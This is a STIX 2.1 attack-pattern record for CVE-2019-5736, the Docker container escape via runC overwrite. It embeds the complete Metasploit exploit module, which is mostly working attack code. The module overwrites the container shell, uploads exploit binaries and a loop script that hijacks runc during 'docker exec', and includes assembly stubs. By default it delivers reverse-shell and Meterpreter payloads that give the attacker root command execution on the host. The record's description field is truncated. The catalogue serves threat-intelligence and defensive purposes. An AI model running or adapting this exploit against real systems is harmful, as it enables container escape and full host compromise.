{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7a56fb41-18b6-48e3-b379-4aa71dfac687",
    "created": "2024-08-14T16:59:06.997956Z",
    "modified": "2024-08-14T16:59:06.997961Z",
    "name": "Docker Container Escape Via runC Overwrite",
    "description": " This module leverages a flaw in `runc` to escape a Docker container and get command execution on the host as root. This vulnerability is",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/docker_runc_escape.rb",
            "external_id": "docker_runc_escape.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-5736"
        },
        {
            "source_name": "reference",
            "url": "https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.openwall.com/lists/oss-security/2019/02/13/3"
        },
        {
            "source_name": "reference",
            "url": "https://www.docker.com/blog/docker-security-update-cve-2018-5736-and-container-security-best-practices/"
        },
        {
            "source_name": "exploit_data(CVE-2019-5736",
            "external_id": "CVE-2019-5736.x64.bin)"
        },
        {
            "source_name": "exploit_data(CVE-2019-5736",
            "external_id": "CVE-2019-5736.x86.bin)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n\n  Rank = ManualRanking\n\n  include Msf::Post::Linux::Priv\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  # This matches PAYLOAD_MAX_SIZE in CVE-2019-5736.c\n  PAYLOAD_MAX_SIZE = 1048576\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Docker Container Escape Via runC Overwrite',\n        'Description' => %q{\n          This module leverages a flaw in `runc` to escape a Docker container\n          and get command execution on the host as root. This vulnerability is\n          identified as CVE-2019-5736. It overwrites the `runc` binary with the\n          payload and wait for someone to use `docker exec` to get into the\n          container. This will trigger the payload execution.\n\n          Note that executing this exploit carries important risks regarding\n          the Docker installation integrity on the target and inside the\n          container ('Side Effects' section in the documentation).\n        },\n        'Author' => [\n          'Adam Iwaniuk', # Discovery and original PoC\n          'Borys Pop\u0142awski', # Discovery and original PoC\n          'Nick Frichette', # Other PoC\n          'Christophe De La Fuente', # MSF Module\n          'Spencer McIntyre' # MSF Module co-author ('Prepend' assembly code)\n        ],\n        'References' => [\n          ['CVE', '2019-5736'],\n          ['URL', 'https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html'],\n          ['URL', 'https://www.openwall.com/lists/oss-security/2019/02/13/3'],\n          ['URL', 'https://www.docker.com/blog/docker-security-update-cve-2018-5736-and-container-security-best-practices/']\n        ],\n        'DisclosureDate' => '2019-01-01',\n        'License' => MSF_LICENSE,\n        'Platform' => %w[linux unix],\n        'Arch' => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix (In-Memory)',\n            {\n              'Platform' => 'unix',\n              'Type' => :unix_memory,\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux (Dropper) x64',\n            {\n              'Platform' => 'linux',\n              'Type' => :linux_dropper,\n              'Arch' => ARCH_X64,\n              'Payload' => {\n                'Prepend' => Metasm::Shellcode.assemble(Metasm::X64.new, <<-ASM).encode_string\n                    push 4\n                    pop  rdi\n                  _close_fds_loop:\n                    dec rdi\n                    push 3\n                    pop rax\n                    syscall\n                    test rdi, rdi\n                    jnz _close_fds_loop\n\n                    mov  rax, 0x000000000000006c\n                    push rax\n                    mov  rax, 0x6c756e2f7665642f\n                    push rax\n                    mov  rdi, rsp\n                    xor  rsi, rsi\n\n                    push 2\n                    pop  rax\n                    syscall\n\n                    push 2\n                    pop  rax\n                    syscall\n\n                    push 2\n                    pop  rax\n                    syscall\n                ASM\n              },\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n                'PrependFork' => true\n              }\n            }\n          ],\n          [\n            'Linux (Dropper) x86',\n            {\n              'Platform' => 'linux',\n              'Type' => :linux_dropper,\n              'Arch' => ARCH_X86,\n              'Payload' => {\n                'Prepend' => Metasm::Shellcode.assemble(Metasm::X86.new, <<-ASM).encode_string\n                    push 4\n                    pop  edi\n                  _close_fds_loop:\n                    dec  edi\n                    push 6\n                    pop  eax\n                    int  0x80\n                    test edi, edi\n                    jnz  _close_fds_loop\n\n                    push 0x0000006c\n                    push 0x7665642f\n                    push 0x6c756e2f\n                    mov  ebx, esp\n                    xor  ecx, ecx\n\n                    push 5\n                    pop  eax\n                    int  0x80\n\n                    push 5\n                    pop  eax\n                    int  0x80\n\n                    push 5\n                    pop  eax\n                    int  0x80\n                ASM\n              },\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp',\n                'PrependFork' => true\n              }\n            }\n          ]\n        ],\n        'DefaultOptions' => {\n          # Give the user on the target plenty of time to trigger the payload\n          'WfsDelay' => 300\n        },\n        'DefaultTarget' => 1,\n        'Notes' => {\n          # Docker may hang and will need to be restarted\n          'Stability' => [CRASH_SERVICE_DOWN, SERVICE_RESOURCE_LOSS, OS_RESOURCE_LOSS],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new(\n        'OVERWRITE',\n        [\n          true,\n          'Shell to overwrite with \\'#!/proc/self/exe\\'',\n          '/bin/sh'\n        ]\n      ),\n      OptString.new(\n        'SHELL',\n        [\n          true,\n          'Shell to use in scripts (must be different than OVERWRITE shell)',\n          '/bin/bash'\n        ]\n      ),\n      OptString.new(\n        'WRITABLEDIR',\n        [\n          true,\n          'A directory where you can write files.',\n          '/tmp'\n        ]\n      )\n    ])\n  end\n\n  def encode_begin(real_payload, reqs)\n    super\n\n    return unless target['Type'] == :unix_memory\n\n    reqs['EncapsulationRoutine'] = proc do |_reqs, raw|\n      # Replace any instance of the shell we're about to overwrite with the\n      # substitution shell.\n      pl = raw.gsub(/\\b#{datastore['OVERWRITE']}\\b/, datastore['SHELL'])\n      overwrite_basename = File.basename(datastore['OVERWRITE'])\n      shell_basename = File.basename(datastore['SHELL'])\n      # Also, substitute shell base names, since some payloads rely on PATH\n      # environment variable to call a shell\n      pl.gsub!(/\\b#{overwrite_basename}\\b/, shell_basename)\n      # Prepend shebang\n      \"#!#{datastore['SHELL']}\\n#{pl}\\n\\n\"\n    end\n  end\n\n  def exploit\n    unless is_root?\n      fail_with(Failure::NoAccess,\n                'The exploit needs a session as root (uid 0) inside the container')\n    end\n    if target['Type'] == :unix_memory\n      print_warning(\n        \"A ARCH_CMD payload is used. Keep in mind that Docker will be\\n\"\\\n        \"unavailable on the target as long as the new session is alive. Using a\\n\"\\\n        \"Meterpreter payload is recommended, since specific code that\\n\"\\\n        \"daemonizes the process is automatically prepend to the payload\\n\"\\\n        \"and won\\'t block Docker.\"\n      )\n    end\n\n    verify_shells\n\n    path = datastore['WRITABLEDIR']\n    overwrite_shell(path)\n    shell_path = setup_exploit(path)\n\n    print_status(\"Launch exploit loop and wait for #{wfs_delay} sec.\")\n    cmd_exec('/bin/bash', shell_path, wfs_delay, 'Subshell' => false)\n\n    print_status('Done. Waiting a bit more to make sure everything is setup...')\n    sleep(5)\n    print_good('Session ready!')\n  end\n\n  def verify_shells\n    ['OVERWRITE', 'SHELL'].each do |option_name|\n      shell = datastore[option_name]\n      unless command_exists?(shell)\n        fail_with(Failure::BadConfig,\n                  \"Shell specified in #{option_name} module option doesn't exist (#{shell})\")\n      end\n    end\n  end\n\n  def overwrite_shell(path)\n    @shell = datastore['OVERWRITE']\n    @shell_bak = \"#{path}/#{rand_text_alphanumeric(5..10)}\"\n    print_status(\"Make a backup of #{@shell} (#{@shell_bak})\")\n    # This file will be restored if the loop script succeed. Otherwise, the\n    # cleanup method will take care of it.\n    begin\n      copy_file(@shell, @shell_bak)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::NoAccess, \"Unable to backup #{@shell} to #{@shell_bak}: #{e}\")\n    end\n\n    print_status(\"Overwrite #{@shell}\")\n    begin\n      write_file(@shell, '#!/proc/self/exe')\n    rescue Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::NoAccess, \"Unable to overwrite #{@shell}: #{e}\")\n    end\n  end\n\n  def setup_exploit(path)\n    print_status('Upload payload')\n    payload_path = \"#{path}/#{rand_text_alphanumeric(5..10)}\"\n    if target['Type'] == :unix_memory\n      vprint_status(\"Updated payload:\\n#{payload.encoded}\")\n      upload(payload_path, payload.encoded)\n    else\n      pl = generate_payload_exe\n      if pl.size > PAYLOAD_MAX_SIZE\n        fail_with(Failure::BadConfig,\n                  \"Payload is too big (#{pl.size} bytes) and must less than #{PAYLOAD_MAX_SIZE} bytes\")\n      end\n      upload(payload_path, generate_payload_exe)\n    end\n\n    print_status('Upload exploit')\n    exe_path = \"#{path}/#{rand_text_alphanumeric(5..10)}\"\n    upload_and_chmodx(exe_path, get_exploit)\n    register_files_for_cleanup(exe_path)\n\n    shell_path = \"#{path}/#{rand_text_alphanumeric(5..10)}\"\n    @runc_backup_path = \"#{path}/#{rand_text_alphanumeric(5..10)}\"\n    print_status(\"Upload loop shell script ('runc' will be backed up to #{@runc_backup_path})\")\n    upload(shell_path, loop_script(exe_path: exe_path, payload_path: payload_path))\n\n    return shell_path\n  end\n\n  def upload(path, data)\n    print_status(\"Writing '#{path}' (#{data.size} bytes) ...\")\n    begin\n      write_file(path, data)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::NoAccess, \"Unable to upload #{path}: #{e}\")\n    end\n    register_file_for_cleanup(path)\n  end\n\n  def upload_and_chmodx(path, data)\n    upload(path, data)\n    chmod(path, 0o755)\n  end\n\n  def get_exploit\n    target_arch = session.arch\n    if session.arch == ARCH_CMD\n      target_arch = cmd_exec('uname -a').include?('x86_64') ? ARCH_X64 : ARCH_X86\n    end\n    case target_arch\n    when ARCH_X64\n      exploit_data('CVE-2019-5736', 'CVE-2019-5736.x64.bin')\n    when ARCH_X86\n      exploit_data('CVE-2019-5736', 'CVE-2019-5736.x86.bin')\n    else\n      fail_with(Failure::BadConfig, \"The session architecture is not compatible: #{target_arch}\")\n    end\n  end\n\n  def loop_script(exe_path:, payload_path:)\n    <<~SHELL\n      while true; do\n        for f in /proc/*/exe; do\n          tmp=${f%/*}\n          pid=${tmp##*/}\n          cmdline=$(cat /proc/${pid}/cmdline)\n          if [[ -z ${cmdline} ]] || [[ ${cmdline} == *runc* ]]; then\n            #{exe_path} /proc/${pid}/exe #{payload_path} #{@runc_backup_path}&\n            sleep 3\n            mv -f #{@shell_bak} #{@shell}\n            chmod +x #{@shell}\n            exit\n          fi\n        done\n      done\n    SHELL\n  end\n\n  def cleanup\n    super\n\n    # If something went wrong and the loop script didn't restore the original\n    # shell in the docker container, make sure to restore it now.\n    if @shell_bak && file_exist?(@shell_bak)\n      copy_file(@shell_bak, @shell)\n      chmod(@shell, 0o755)\n      print_good('Container shell restored')\n    end\n  rescue Rex::Post::Meterpreter::RequestError => e\n    fail_with(Failure::NoAccess, \"Unable to restore #{@shell}: #{e}\")\n  ensure\n    # Make sure we delete the backup file\n    begin\n      rm_f(@shell_bak) if @shell_bak\n    rescue Rex::Post::Meterpreter::RequestError => e\n      fail_with(Failure::NoAccess, \"Unable to delete #{@shell_bak}: #{e}\")\n    end\n  end\n\n  def on_new_session(new_session)\n    super\n    @session = new_session\n    runc_path = cmd_exec('which docker-runc')\n    if runc_path == ''\n      print_error(\n        \"'docker-runc' binary not found in $PATH. Cannot restore the original runc binary\\n\"\\\n        \"This must be done manually with: 'cp #{@runc_backup_path} <path to docker-runc>'\"\n      )\n      return\n    end\n\n    begin\n      rm_f(runc_path)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Unable to delete #{runc_path}: #{e}\")\n      return\n    end\n    if copy_file(@runc_backup_path, runc_path)\n      chmod(runc_path, 0o755)\n      print_good('Original runc binary restored')\n      begin\n        rm_f(@runc_backup_path)\n      rescue Rex::Post::Meterpreter::RequestError => e\n        print_error(\"Unable to delete #{@runc_backup_path}: #{e}\")\n      end\n    else\n      print_error(\n        \"Unable to restore the original runc binary #{@runc_backup_path}\\n\"\\\n        \"This must be done manually with: 'cp #{@runc_backup_path} runc_path'\"\n      )\n    end\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-01-01",
    "x_mitre_platforms": [
        "linux'"
    ]
}